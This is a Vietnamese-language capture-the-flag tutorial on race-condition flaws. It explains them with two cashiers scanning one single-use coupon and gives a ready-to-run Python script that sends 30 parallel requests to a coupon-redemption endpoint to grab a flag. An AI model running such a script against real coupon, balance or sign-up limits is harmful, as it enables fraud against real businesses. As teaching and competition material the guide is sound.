# Race Condition (2 người cùng quét 1 mã giảm giá "dùng 1 lần" cùng lúc)

Giống việc 2 người cùng quét 1 mã giảm giá "chỉ dùng 1 lần" ở 2 quầy thu ngân khác nhau CÙNG LÚC. Mỗi quầy phải làm 2 bước: (1) kiểm tra "mã còn dùng được không", (2) nếu còn thì đánh dấu "đã dùng". Nếu 2 request đến gần như đồng thời, cả 2 quầy đều kiểm tra thấy "còn dùng được" TRƯỚC KHI quầy nào kịp đánh dấu xong — thế là mã dùng được 2 lần, dù đáng lẽ chỉ 1 lần. Server cũng vậy: "kiểm tra rồi ghi" tưởng là 1 việc trong đầu lập trình viên, nhưng với máy tính luôn là 2 bước tách rời, có 1 khoảng trễ rất ngắn ở giữa.

Trên Burp bạn nhận ra lỗi này khi: có chức năng giới hạn số lần ("dùng coupon 1 lần", "rút tiền không âm số dư", "mỗi người chỉ đăng ký 1 suất") — bạn gửi request đó 20-50 lần **song song thật sự** (không phải gửi nhanh liên tiếp từng cái một), và thấy nhiều hơn 1 request báo "thành công" dù đáng lẽ chỉ 1 được phép.

Bài này dùng kỹ thuật gửi nhiều request đồng thời đã có ở [`03_Thao_Tac_Nang_Cao/02_Request_Dong_Thoi.md`](../03_Thao_Tac_Nang_Cao/02_Request_Dong_Thoi.md) — đọc file đó trước nếu chưa quen `ThreadPoolExecutor`. Bài này không lặp lại giải thích đó, chỉ tập trung vào TẠI SAO và KHI NÀO dùng kỹ thuật đó để khai thác.

## Snippet copy-là-chạy

```python
import re
import requests
from concurrent.futures import ThreadPoolExecutor

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")


def solve_one(session, base_url):
    url = f"{base_url}/redeem-coupon"

    def attempt(_):
        # Mỗi lần gọi là 1 bản sao giống hệt request "dùng coupon" -- không có gì khác
        # nhau giữa các lần gọi, điểm khác biệt duy nhất là chúng được gửi GẦN NHƯ CÙNG LÚC
        try:
            return session.post(url, json={"code": "SALE50"}, timeout=5).text
        except requests.RequestException:
            return ""

    # Gửi 30 request đồng thời -- xem kỹ thuật ThreadPoolExecutor ở
    # 03_Thao_Tac_Nang_Cao/02_Request_Dong_Thoi.md, ở đây chỉ dùng lại, không giải thích lại
    with ThreadPoolExecutor(max_workers=30) as ex:
        results = list(ex.map(attempt, range(30)))

    # Đếm số lần "thành công" để xác nhận có đúng là race condition không
    success_count = sum(1 for text in results if "success" in text.lower())
    print(f"Số request thành công: {success_count} / 30 (đáng lẽ chỉ được 1)")

    for text in results:
        m = FLAG_RE.search(text)
        if m:
            return m.group(0)
    return None


if __name__ == "__main__":
    s = requests.Session()
    s.verify = False
    print("Flag:", solve_one(s, "http://target"))
```

## Giải thích cho người mới

- Khác với các lỗi khác, request gửi đi trong bài này **không có gì đặc biệt** trong nội dung — nó giống y hệt 1 request hợp lệ bình thường. Thứ khiến nó thành lỗ hổng là **thời điểm gửi**: phải đến server gần như cùng lúc để "lọt" vào khoảng trễ giữa bước kiểm tra và bước ghi.
- `ex.map(attempt, range(30))` gọi hàm `attempt` 30 lần, mỗi lần với 1 "worker" riêng (xem chi tiết cơ chế này ở `02_Request_Dong_Thoi.md`) — tất cả được giao việc gần như đồng thời.
- Biến `success_count`: nếu server xử lý đúng (có khóa/transaction), bạn sẽ thấy đúng 1/30 thành công, còn lại bị từ chối "đã dùng". Nếu thấy nhiều hơn 1 (ví dụ 15/30), đó là race condition đã xảy ra thật.
- Nếu `ThreadPoolExecutor` với 30-50 worker vẫn chỉ cho ra đúng 1 request thành công mỗi lần thử, có thể server đã chống lỗi này đúng cách, hoặc khoảng trễ (window race) quá hẹp với tốc độ Python threading — không có cách nào chắc 100% khai thác được, đây là lỗi phụ thuộc thời điểm/tải server lúc đó.

## Lưu ý nhanh

- Gửi **song song thật sự** (nhiều request cùng lúc), không phải vòng `for` gửi tuần tự — tuần tự vẫn có độ trễ giữa các lần gửi, không tạo ra chồng lấp thời gian cần thiết.
- WAF không chặn được race condition bằng cách soi nội dung request (giống cách chặn IDOR/SQLi) vì mọi request đều hợp lệ — chỉ có thể rate-limit (giảm số request/giây), không triệt tiêu hoàn toàn.
- Kết quả có thể không ổn định (lúc ăn lúc không) — đây là bản chất của lỗi này, thử lại nhiều lần, tăng số lượng request mỗi đợt nếu lần đầu không thấy hiệu quả.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
